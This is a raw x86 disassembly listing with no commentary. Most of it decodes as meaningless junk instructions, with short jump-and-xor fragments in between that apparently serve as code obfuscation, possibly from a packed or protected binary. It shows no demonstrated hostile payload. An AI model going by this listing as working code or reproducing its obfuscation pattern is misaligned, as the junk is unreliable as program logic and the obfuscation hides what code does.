  40f0dc:	sti    
  40f0dd:	test   BYTE PTR cs:[esi-0x75],dl
  40f0e1:	dec    ecx
  40f0e2:	hlt    
  40f0e3:	aad    0x8d
  40f0e5:	dec    edx
  40f0e6:	pusha  
  40f0e7:	add    eax,0x899a51cd
  40f0ec:	push   esi
  40f0ed:	pop    ds
  40f0ee:	icebp  
  40f0ef:	xchg   esi,eax
  40f0f0:	sbb    eax,0x55d1d83c
  40f0f5:	scas   al,BYTE PTR es:[edi]
  40f0f6:	xchg   ebx,eax
  40f0f7:	mov    bh,0xf1
  40f0f9:	jg     0x40f0aa
  40f0fb:	mov    dh,0xa3
  40f0fd:	push   ebx
  40f0fe:	fstp   TBYTE PTR [esi-0x29081800]
  40f104:	in     eax,0x56
  40f106:	push   ecx
  40f107:	hlt    
  40f108:	sub    al,0x7c
  40f10a:	or     eax,0x2f62e344
  40f10f:	aas    
  40f110:	aas    
  40f111:	or     DWORD PTR [edx],0xffffff85
  40f114:	or     DWORD PTR [ebp-0x79],0xffffffc2
  40f118:	(bad)  
  40f119:	and    ecx,DWORD PTR [esp+ebp*2+0x394d3fd9]
  40f120:	int3   
  40f121:	mov    esi,0x2c5712f1
  40f126:	pop    ebp
  40f127:	push   esi
  40f128:	mov    esp,edi
  40f12a:	xlat   BYTE PTR ds:[ebx]
  40f12b:	sub    ebp,DWORD PTR [eax]
  40f12d:	pop    ds
  40f12e:	push   ds
  40f12f:	push   ebx
  40f130:	pop    ebp
  40f131:	dec    ebp
  40f132:	bswap  edi
  40f134:	bound  ebp,QWORD PTR [ebx+0x68]
  40f137:	fdivr  QWORD PTR [eax+0x22]
  40f13a:	repz dec esp
  40f13c:	or     ecx,esi
  40f13e:	add    dl,BYTE PTR [ebp+0x33d1555c]
  40f144:	push   edx
  40f145:	stos   DWORD PTR es:[edi],eax
  40f146:	rcr    BYTE PTR [esp+edi*1],cl
  40f149:	fstp   QWORD PTR ds:0x82804a01
  40f14f:	ror    BYTE PTR [esi],cl
  40f151:	scas   al,BYTE PTR es:[edi]
  40f152:	cmc    
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [edi-0x5c29cdc9],ebp
  40f172:	stos   BYTE PTR es:[edi],al
  40f173:	jo     0x40f1e5
  40f175:	ret    
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1aa
  40f17a:	test   DWORD PTR [edi+0x6597a662],0x1c283f88
  40f184:	sub    ebp,DWORD PTR [ecx]
  40f186:	inc    edi
  40f187:	xchg   ecx,eax
  40f188:	push   0xffffff97
  40f18a:	and    ecx,edi
  40f18c:	mov    ch,dh
  40f18e:	and    DWORD PTR [eax-0xf],esp
  40f191:	pop    ds
  40f192:	mov    DWORD PTR [esi-0x3de1c233],edi
  40f198:	xchg   ecx,eax
  40f199:	xchg   ebp,eax
  40f19a:	pop    ds
  40f19b:	imul   edx,ebx,0xffffffd7
  40f19e:	mov    al,ds:0x6c15fd20
  40f1a3:	in     al,0xa7
  40f1a5:	int    0x62
  40f1a7:	ds std 
  40f1a9:	out    0x96,al
  40f1ab:	mov    ch,0x9a
  40f1ad:	mov    ah,0x93
  40f1af:	inc    eax
  40f1b0:	xchg   ebp,eax
  40f1b1:	sti    
  40f1b2:	es call 0xc4b0:0xf06bc9c
  40f1ba:	imul   esi,DWORD PTR [esi+0x7b],0xd1987aea
  40f1c1:	je     0x40f18d
  40f1c3:	ret    
  40f1c4:	daa    
  40f1c5:	or     eax,0x11688e2c
  40f1ca:	cmp    dl,BYTE PTR [ebx+eax*1]
  40f1cd:	add    eax,0x91e7b1e6
  40f1d2:	bound  edx,QWORD PTR [edx+0x27]
  40f1d5:	cmp    BYTE PTR [bp+si],dh
  40f1d8:	push   esp
  40f1d9:	mov    al,ds:0x2d94b789
  40f1de:	xchg   BYTE PTR [edx-0x36422097],cl
  40f1e4:	arpl   WORD PTR [eax+eax*8+0x2a910b96],di
  40f1eb:	pop    edi
  40f1ec:	add    dh,BYTE PTR [esi+0xf1188da]
  40f1f2:	scas   eax,DWORD PTR es:[edi]
  40f1f3:	inc    esi
  40f1f4:	or     eax,0xe2756f97
  40f1f9:	jno    0x40f20d
  40f1fb:	push   ss
  40f1fc:	pop    esi
  40f1fd:	out    dx,al
  40f1fe:	loop   0x40f25a
  40f200:	lahf   
  40f201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f202:	into   
  40f203:	mov    bh,0xd1
  40f205:	inc    esp
  40f206:	push   edx
  40f207:	add    DWORD PTR [ebx],edi
  40f209:	or     esp,0x6ae1682a
  40f20f:	pop    ss
  40f210:	cmp    ecx,DWORD PTR [ecx+0x5d]
  40f213:	mov    edi,0xaaeb9aff
  40f218:	pop    ds
  40f219:	mov    ebx,0xaa8a1766
  40f21e:	mov    WORD PTR [ebp+0x38],ss
  40f221:	mov    ebp,DWORD PTR [edi+0x722c3396]
  40f227:	sbb    BYTE PTR [ecx-0x39],ch
  40f22a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f22b:	mov    al,0x20
  40f22d:	xchg   ebp,eax
  40f22e:	push   ss
  40f22f:	sahf   
  40f230:	mov    ebx,0x799f6de9
  40f235:	inc    esi
  40f236:	mov    ebx,0xe6833528
  40f23b:	or     BYTE PTR [ecx-0x35],cl
  40f23e:	nop
  40f23f:	or     edi,DWORD PTR [edx-0x10743c88]
  40f245:	inc    eax
  40f246:	jge    0x40f21f
  40f248:	push   es
  40f249:	stc    
  40f24a:	cmp    al,0x3b
  40f24c:	mov    bh,0x9c
  40f24e:	jge    0x40f25b
  40f250:	mov    ch,0xb
  40f252:	sub    DWORD PTR [esi-0x6b],ecx
  40f255:	mov    edi,0xbe4fc3a9
  40f25a:	mov    edi,0x1b50c61e
  40f25f:	cmp    DWORD PTR [edx-0x5f],edi
  40f262:	fadd   QWORD PTR [esi]
  40f264:	inc    edx
  40f265:	mov    al,0x13
  40f267:	cs (bad) 
  40f269:	mov    esp,0x981fae15
  40f26e:	jnp    0x40f2b5
  40f270:	scas   al,BYTE PTR es:[edi]
  40f271:	xor    al,BYTE PTR [edx]
  40f273:	jnp    0x40f2d3
  40f275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f276:	push   es
  40f277:	push   ss
  40f278:	adc    BYTE PTR [ebx+0x69f2ce42],0x54
  40f27f:	stos   BYTE PTR es:[edi],al
  40f280:	jbe    0x40f240
  40f282:	out    dx,eax
  40f283:	inc    ebx
  40f284:	jmp    0x30270ba6
  40f289:	add    dl,BYTE PTR [ebx]
  40f28b:	fcomp  QWORD PTR [eax+ecx*2-0x7f]
  40f28f:	jl     0x40f232
  40f291:	add    eax,0x13d1997
  40f296:	jnp    0x40f2af
  40f298:	sbb    al,0xeb
  40f29a:	mov    ch,0x7a
  40f29c:	int    0x41
  40f29e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f29f:	inc    eax
  40f2a0:	add    edx,DWORD PTR [ebx-0x3defca6f]
  40f2a6:	fwait
  40f2a7:	test   eax,0x460fadd2
  40f2ac:	inc    edx
  40f2ad:	enter  0x8087,0xa4
  40f2b1:	loope  0x40f2f8
  40f2b3:	pop    ebp
  40f2b4:	mov    al,ds:0xeaba9083
  40f2b9:	fsubrp st(6),st
  40f2bb:	or     edx,DWORD PTR [ebp-0x6c]
  40f2be:	call   0xcf143d2e
  40f2c3:	add    al,0xc6
  40f2c5:	add    edi,0x341e8900
  40f2cb:	pusha  
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	sar    ch,1
  40f2f8:	arpl   si,si
  40f2fa:	in     eax,dx
  40f2fb:	jbe    0x40f2a6
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f2b2
  40f304:	popa   
  40f305:	ds add al,0x30
  40f308:	sbb    DWORD PTR [eax+0x20],esi
  40f30b:	add    ah,cl
  40f30d:	retf   0x1eaa
  40f310:	add    edx,DWORD PTR [edi-0x6de3881d]
  40f316:	fisub  WORD PTR [ebp+0x725b5096]
  40f31c:	push   ecx
  40f31d:	div    BYTE PTR [ebx-0x2b]
  40f320:	outs   dx,BYTE PTR ds:[esi]
  40f321:	out    0x2d,eax
  40f323:	mov    bl,0xc
  40f325:	push   ecx
  40f326:	adc    bl,bl
  40f328:	mov    ch,0xed
  40f32a:	in     eax,dx
  40f32b:	stos   BYTE PTR es:[edi],al
  40f32c:	add    al,0x2b
  40f32e:	fadd   DWORD PTR [eax+0x4c]
  40f331:	inc    eax
  40f332:	add    dh,BYTE PTR [ecx]
  40f334:	lods   eax,DWORD PTR ds:[esi]
  40f335:	push   ds
  40f336:	mov    ecx,0x9b4ecf7b
  40f33b:	imul   ecx,DWORD PTR [ecx+ebx*1-0x6fed093b],0x6a
  40f343:	out    0x61,al
  40f345:	outs   dx,BYTE PTR ds:[esi]
  40f346:	popf   
  40f347:	pop    ds
  40f348:	pop    ebp
  40f349:	out    0x17,al
  40f34b:	jg     0x40f36d
  40f34d:	(bad)  
  40f34e:	mov    ds:0x8a425381,eax
  40f353:	xor    DWORD PTR [ecx],ecx
  40f355:	dec    edi
  40f356:	mov    bl,0xf6
  40f358:	xor    ebx,DWORD PTR [esi]
  40f35a:	(bad)  
  40f35b:	xchg   ebp,eax
  40f35c:	ss mov cl,0xef
  40f35f:	jno    0x40f3be
  40f361:	push   ds
  40f362:	adc    al,BYTE PTR [ecx]
  40f364:	shr    DWORD PTR [edx],1
  40f366:	sub    DWORD PTR [esi],esp
  40f368:	sahf   
  40f369:	mov    ecx,DWORD PTR [ebx+esi*2-0x5e]
  40f36d:	push   ecx
  40f36e:	imul   esp,DWORD PTR ds:0x95354ee8,0x4b
  40f375:	inc    ebp
  40f376:	push   es
  40f377:	push   ebx
  40f378:	mov    edi,0x9ab773b
  40f37d:	xor    dl,ch
  40f37f:	mov    al,0x82
  40f381:	imul   edx,DWORD PTR [ecx-0x1],0x994f8d93
  40f388:	jmp    0xcffb:0x6ab8dfb1
  40f38f:	rcl    DWORD PTR [ebx+0x51],0x72
  40f393:	fimul  WORD PTR [edx]
  40f395:	push   0xffffffa7
  40f397:	mov    ch,0x9b
  40f399:	ja     0x40f403
  40f39b:	inc    esi
  40f39c:	cmp    BYTE PTR [edi-0x54],bl
  40f39f:	in     al,0x8a
  40f3a1:	repnz xchg edi,eax
  40f3a3:	cmc    
  40f3a4:	or     al,0x6a
  40f3a6:	inc    ebp
  40f3a7:	mov    dh,0x29
  40f3a9:	xlat   BYTE PTR ds:[ebx]
  40f3aa:	in     eax,dx
  40f3ab:	fiadd  DWORD PTR ds:[esi+0x4]
  40f3af:	xor    cl,ah
  40f3b1:	and    al,0x85
  40f3b3:	pop    ebp
  40f3b4:	loopne 0x40f356
  40f3b6:	or     eax,0x9b65e4c7
  40f3bb:	dec    edi
  40f3bc:	mov    dh,0x9e
  40f3be:	sbb    DWORD PTR [ebx],esi
  40f3c0:	mov    cs,WORD PTR [edi+0x43ecce74]
  40f3c6:	out    0xf3,al
  40f3c8:	inc    ebp
  40f3c9:	iret   
  40f3ca:	sub    ebx,DWORD PTR [ebx+ecx*1-0xf298a06]
  40f3d1:	mov    edi,0xab8265d9
  40f3d6:	push   ebp
  40f3d7:	adc    edx,0x147a5a36
  40f3dd:	mov    ebx,DWORD PTR [edi-0x462d6683]
  40f3e3:	jae    0x40f40a
  40f3e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3e6:	push   ebp
  40f3e7:	sbb    DWORD PTR [ebx+esi*2],esp
  40f3ea:	shl    ah,cl
  40f3ec:	and    eax,0x704c015e
  40f3f1:	sbb    DWORD PTR [esi],esi
  40f3f3:	add    BYTE PTR [ebx],0xc4
  40f3f6:	dec    eax
  40f3f7:	leave  
  40f3f8:	push   eax
  40f3f9:	jmp    0xef148951
  40f3fe:	icebp  
  40f3ff:	or     al,0x73
  40f401:	adc    al,0xb8
  40f403:	push   ss
  40f404:	and    BYTE PTR [ebx+0x64],0x88
  40f408:	bt     ebx,ebp
  40f40b:	inc    esi
  40f40d:	out    dx,al
  40f40e:	jmp    0xfcd037b1
  40f413:	mov    ds:0x74a7e31b,eax
  40f418:	and    edx,eax
  40f41a:	aas    
  40f41b:	enter  0x3a38,0xec
  40f41f:	test   BYTE PTR [esi+0xebca848],al
  40f425:	mul    DWORD PTR [ebx-0x12]
  40f428:	lods   al,BYTE PTR ds:[esi]
  40f429:	xor    al,0x44
  40f42b:	xlat   BYTE PTR ds:[ebx]
  40f42c:	(bad)  
  40f42d:	nop
  40f42e:	and    DWORD PTR [ebp+edi*8+0x6444aa08],ecx
  40f435:	xchg   DWORD PTR [ecx-0x1585fc2],edi
  40f43b:	call   FWORD PTR [edi+edx*4]
  40f43e:	lds    esp,FWORD PTR [ebp-0x2c2ebc7c]
  40f444:	sbb    eax,0x55f15040
  40f449:	(bad)  
  40f44a:	pop    edi
  40f44b:	xor    BYTE PTR [edx-0x74a1fb1b],bh
  40f451:	inc    ebp
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	inc    ebp
  40f465:	xor    al,0x58
  40f467:	inc    ebx
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	fs adc eax,0xec26ff6b
  40f476:	mov    ebx,0x2b69c603
  40f47b:	push   esp
  40f47c:	lods   ax,WORD PTR ds:[esi]
  40f47e:	jle    0x40f400
  40f480:	arpl   WORD PTR [edi+0x306b05c3],dx
  40f486:	nop
  40f487:	push   edi
  40f488:	cmp    al,0xec
  40f48a:	in     al,dx
  40f48b:	add    ebp,DWORD PTR [ecx+ecx*4-0x4f]
  40f48f:	pop    edx
  40f490:	mov    ss,WORD PTR [esi]
  40f492:	xchg   BYTE PTR ds:0x991b6b97,bh
  40f498:	xchg   ebx,eax
  40f499:	in     eax,0xb0
  40f49b:	(bad)  
  40f49d:	bound  esi,QWORD PTR [ebp-0x32da109c]
  40f4a3:	xlat   BYTE PTR fs:[ebx]
  40f4a5:	adc    edx,DWORD PTR [edi+0x1a329db3]
  40f4ab:	fld    TBYTE PTR ds:0x2f366095
  40f4b1:	mov    BYTE PTR ds:0x67434779,bh
  40f4b7:	adc    BYTE PTR [ebx-0x76],al
  40f4ba:	std    
  40f4bb:	leave  
  40f4bc:	rol    BYTE PTR [ebx+0x5e],0xb4
  40f4c0:	mov    DWORD PTR [eax+0x1b],ebp
  40f4c3:	cdq    
  40f4c4:	icebp  
  40f4c5:	pop    ecx
  40f4c6:	jmp    0x3591060d
  40f4cb:	(bad)  [ecx]
  40f4cd:	sar    BYTE PTR [ecx+0x6c],cl
  40f4d0:	jl     0x40f455
  40f4d2:	scas   eax,DWORD PTR es:[edi]
  40f4d3:	mov    edx,DWORD PTR [esi+0x7b]
  40f4d6:	xchg   esi,eax
  40f4d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4d8:	and    BYTE PTR [eax],0x46
  40f4db:	bnd jmp DWORD PTR [eax+0x7e]
  40f4df:	xchg   esp,eax
  40f4e0:	sub    ebx,ecx
  40f4e2:	bound  esp,QWORD PTR [ebx-0x4c]
  40f4e5:	mov    ?,WORD PTR [esi*1-0x60dba5ab]
  40f4ec:	popa   
  40f4ed:	test   eax,0x71bd71f3
  40f4f2:	jmp    0xd1a6:0xcb167ed5
  40f4f9:	mov    dh,0xb7
  40f4fb:	sub    ecx,0xaa58a442
  40f501:	stc    
  40f502:	adc    WORD PTR [ecx],0x9639
  40f507:	mov    dh,0x6f
  40f509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f50a:	scas   al,BYTE PTR es:[edi]
  40f50b:	in     eax,dx
  40f50c:	jnp    0x40f4be
  40f50e:	jl     0x40f501
  40f510:	cld    
  40f511:	mov    ch,0x7e
  40f513:	imul   BYTE PTR [ebp+ebp*8+0x4a]
  40f517:	jp     0x40f50c
  40f519:	pop    esi
  40f51a:	leave  
  40f51b:	cmp    BYTE PTR [edx+edx*1-0x1ecd3e88],bh
  40f522:	hlt    
  40f523:	and    esi,0xffffffab
  40f526:	mov    esp,0xe9246dce
  40f52b:	and    BYTE PTR [eax-0x13],cl
  40f52e:	push   edi
  40f52f:	hlt    
  40f530:	enter  0x37b8,0x99
  40f534:	mov    gs,WORD PTR [esi+ebp*4]
  40f537:	mov    ecx,0xda74d466
  40f53c:	sbb    al,dl
  40f53e:	in     eax,0xc1
  40f540:	js     0x40f4d2
  40f542:	or     BYTE PTR [eax+0x32c36f6],bh
  40f548:	fs mov dl,0xcd
  40f54b:	jecxz  0x40f4d8
  40f54d:	sahf   
  40f54e:	mov    cs,esp
  40f550:	repz ss cdq 
  40f553:	les    esi,FWORD PTR [edx]
  40f555:	xchg   ebp,eax
  40f556:	and    al,0xbb
  40f558:	add    eax,0xd356dc66
  40f55d:	aaa    
  40f55e:	imul   BYTE PTR [ecx-0x6d2e60c3]
  40f564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f565:	jge    0x40f5bf
  40f567:	pop    ebx
  40f568:	mov    edx,0x9d20064d
  40f56d:	sub    edx,DWORD PTR [edi-0x8]
  40f570:	rcl    DWORD PTR [edi],1
  40f572:	aas    
  40f573:	clc    
  40f574:	jmp    0x128a:0x5eedb931
  40f57b:	pop    ecx
  40f57c:	(bad)  
  40f57e:	cmp    DWORD PTR [ebp+0x5d],ecx
  40f581:	mov    ecx,0x7ec9edea
  40f586:	retf   0x425d
  40f589:	stos   BYTE PTR es:[edi],al
  40f58a:	mov    eax,ds:0x873c3262
  40f58f:	pop    ebx
  40f590:	das    
  40f591:	into   
  40f592:	daa    
  40f593:	aas    
  40f594:	xor    ebx,DWORD PTR [esi+0xd2f8317]
  40f59a:	js     0x40f5eb
  40f59c:	xor    DWORD PTR ds:0xd3a86305,edx
  40f5a2:	loop   0x40f58e
  40f5a4:	shr    DWORD PTR [edx+eiz*8-0x562fbf63],cl
  40f5ab:	and    ax,0x8634
  40f5af:	xlat   BYTE PTR ds:[ebx]
  40f5b0:	add    eax,eax
  40f5b2:	mov    ebp,0xc155c4c6
  40f5b7:	mov    esi,0x82b0c39f
  40f5bc:	jecxz  0x40f549
  40f5be:	add    BYTE PTR [ebx+0xc8d3c40],cl
  40f5c4:	int    0x78
  40f5c6:	add    BYTE PTR [eax],al
  40f5c8:	add    BYTE PTR [ebx],al
  40f5ca:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40f5d1:	add    al,0x8
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	or     ecx,ebp
  40f605:	jmp    0xc370:0x70b68ceb
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f68a
  40f610:	mov    cl,0x29
  40f612:	shr    BYTE PTR [ebp-0xe246fc8],cl
  40f618:	sti    
  40f619:	mov    esp,0x2cfe3006
  40f61e:	pusha  
  40f61f:	rsm    
  40f621:	ins    DWORD PTR es:[edi],dx
  40f622:	add    esp,DWORD PTR [ebx]
  40f624:	pop    ecx
  40f625:	pushf  
  40f626:	jnp    0x40f694
  40f628:	nop
  40f629:	call   0xb92f:0x2d6ce062
  40f630:	neg    BYTE PTR [esi+0x7a]
  40f633:	jle    0x40f5e1
  40f635:	or     DWORD PTR [ebp-0x72],esp
  40f638:	es nop
  40f63a:	mov    dh,BYTE PTR [edi+0x2b2de811]
  40f640:	cmp    al,0x83
  40f642:	enter  0x9ea8,0x81
  40f646:	add    al,ah
  40f648:	mov    ds:0x24e44854,al
  40f64d:	test   al,0x0
  40f64f:	das    
  40f650:	mov    dl,0x5c
  40f652:	pop    esi
  40f653:	mov    esi,0xdf51770c
  40f658:	ret    
  40f659:	mov    ebp,0x1c7faf27
  40f65e:	adc    al,0x0
  40f660:	ficom  WORD PTR [ecx+0x6a5b2590]
  40f666:	loop   0x40f68e
  40f668:	(bad)  
  40f669:	xchg   esi,eax
  40f66a:	in     al,0xeb
  40f66c:	fdiv   DWORD PTR [edi+0x12c138dc]
  40f672:	or     DWORD PTR [ecx+0x1600d0cf],ebx
  40f678:	int3   
  40f679:	ror    DWORD PTR [ecx-0x72],cl
  40f67c:	inc    edx
  40f67d:	ds out 0x1,eax
  40f680:	test   DWORD PTR [eax-0x15],0x475d4f81
  40f687:	(bad)
  40f68a:	xchg   DWORD PTR [eax+0x35e4f69a],ebx
  40f690:	es inc esp
  40f692:	cmp    al,0x79
  40f694:	xor    DWORD PTR [ebx],ebp
  40f696:	and    DWORD PTR cs:[edx-0x3f9a038e],ebx
  40f69d:	or     eax,0xb05b629e
  40f6a2:	call   0x5b9d:0xe65062b3
  40f6a9:	push   ds
  40f6aa:	jle    0x40f651
  40f6ac:	xlat   BYTE PTR ds:[ebx]
  40f6ad:	push   ebx
  40f6ae:	jecxz  0x40f720
  40f6b0:	cld    
  40f6b1:	fbld   TBYTE PTR ds:0xb132cb4a
  40f6b7:	sub    ah,al
  40f6b9:	out    0x88,eax
  40f6bb:	mov    dh,0xc3
  40f6bd:	push   edx
  40f6be:	push   eax
  40f6bf:	sbb    bh,bl
  40f6c1:	sbb    bh,BYTE PTR [edi+0x2f]
  40f6c4:	push   0x17d067c5
  40f6c9:	lds    ebp,FWORD PTR [ecx-0x50]
  40f6cc:	stos   DWORD PTR es:[edi],eax
  40f6cd:	add    BYTE PTR [edx+ebx*2],dl
  40f6d0:	jno    0x40f69e
  40f6d2:	or     al,0xff
  40f6d4:	sbb    esi,DWORD PTR [eax]
  40f6d6:	sbb    eax,0x128f6875
  40f6db:	or     ebx,DWORD PTR [ecx-0x58fb0e35]
  40f6e1:	inc    esp
  40f6e2:	or     BYTE PTR [ecx-0x3c],0x58
  40f6e6:	push   ds
  40f6e7:	pop    eax
  40f6e8:	rcr    DWORD PTR [ebx-0x51abe5e4],0x3c
  40f6ef:	jbe    0x40f6cc
  40f6f1:	neg    DWORD PTR [ecx+0x7e52b486]
  40f6f7:	xor    al,BYTE PTR [edx]
  40f6f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6fa:	aaa    
  40f6fb:	ret    
  40f6fc:	aam    0x5c
  40f6fe:	fimul  WORD PTR [edi+0x577992e5]
  40f704:	add    al,0xc4
  40f706:	jp     0x40f776
  40f708:	mov    edi,DWORD PTR [ebx+ecx*8-0x62731de5]
  40f70f:	and    bh,ch
  40f711:	js     0x40f6f5
  40f713:	ret    
  40f714:	mov    bl,0x3
  40f716:	ja     0x40f6e0
  40f718:	retw   
  40f71a:	pop    ebx
  40f71b:	nop
  40f71c:	sub    BYTE PTR [ecx+0x341d3501],ah
  40f722:	js     0x40f6ec
  40f724:	je     0x40f6da
  40f726:	std    
  40f727:	hlt    
  40f728:	dec    ebx
  40f729:	push   es
  40f72a:	cwde   
  40f72b:	jle    0x40f71e
  40f72d:	push   es
  40f72e:	imul   edx,edx,0x1a48684
  40f734:	mov    eax,0x42764b3e
  40f739:	push   esp
  40f73a:	mov    ds:0xec90ab47,al
  40f73f:	neg    DWORD PTR [ebx+0x2c]
  40f742:	mov    ecx,0x51727acf
  40f747:	lahf   
  40f748:	sar    BYTE PTR [esp+esi*4+0x5e],0xa2
  40f74d:	fadd   DWORD PTR [eax-0x56]
  40f750:	mov    ah,0x7a
  40f752:	mov    gs,WORD PTR [ecx-0xdcbdf57]
  40f758:	cdq    
  40f759:	push   0x458bb4c8
  40f75e:	clc    
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x867246f3
  40f7e3:	mov    cl,BYTE PTR [edi+ebx*2-0x4b]
  40f7e7:	jo     0x40f859
  40f7e9:	mov    ds:0x6e70707d,eax
  40f7ee:	test   eax,0x1b58c137
  40f7f3:	pop    edi
  40f7f4:	sub    dh,ah
  40f7f6:	fadd   st(1),st
  40f7f8:	add    BYTE PTR [ecx],al
  40f7fa:	stos   BYTE PTR es:[edi],al
  40f7fb:	sbb    edx,DWORD PTR [esi+0x1497a21f]
  40f801:	xor    al,0xf0
  40f803:	jae    0x40f82b
  40f805:	push   esp
  40f806:	repz pop ebx
  40f808:	xor    BYTE PTR [esi],al
  40f80a:	add    eax,0xd3aa7e8d
  40f80f:	mov    edi,0xaf8721d9
  40f814:	xchg   esi,eax
  40f815:	loop   0x40f856
  40f817:	jge    0x40f826
  40f819:	xchg   BYTE PTR [edx-0x30],cl
  40f81c:	adc    BYTE PTR [ecx+0x76],ah
  40f81f:	(bad)  
  40f820:	stos   DWORD PTR es:[edi],eax
  40f821:	xor    eax,0x58a1ad83
  40f826:	(bad)  
  40f827:	pop    ds
  40f828:	scas   al,BYTE PTR es:[edi]
  40f829:	jbe    0x40f847
  40f82b:	fcomp  st(4)
  40f82d:	pop    ebx
  40f82e:	stc    
  40f82f:	xor    eax,0xa4d56880
  40f834:	ds mov esp,0xa198a560
  40f83a:	sbb    eax,0xc227a3f1
  40f83f:	push   0xffffffd5
  40f841:	addr16 mov al,0x30
  40f844:	push   ds
  40f845:	or     DWORD PTR [eax+0x3eb4e54d],0x918529a4
  40f84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f850:	aaa    
  40f851:	adc    DWORD PTR [edi+0x5aa2e5f4],edx
  40f857:	sub    eax,0x29779a9f
  40f85c:	or     eax,0x8b9fa263
  40f861:	lock xchg ebp,eax
  40f863:	push   es
  40f864:	out    0xab,al
  40f866:	adc    al,0xe9
  40f868:	addr16 test eax,0xcddff241
  40f86e:	lods   al,BYTE PTR ds:[esi]
  40f86f:	pusha  
  40f870:	div    DWORD PTR [esi-0x3]
  40f873:	mov    esp,0x89c961c5
  40f878:	lods   al,BYTE PTR ds:[esi]
  40f879:	xchg   edx,eax
  40f87a:	and    ebp,ecx
  40f87c:	add    DWORD PTR ds:0x55b98df,esi
  40f882:	mov    al,ds:0x617feb18
  40f887:	jo     0x40f812
  40f889:	pusha  
  40f88a:	or     ch,BYTE PTR [edi+0x78]
  40f88d:	lea    ebp,[eax+ebp*8-0x5d]
  40f891:	jecxz  0x40f8d1
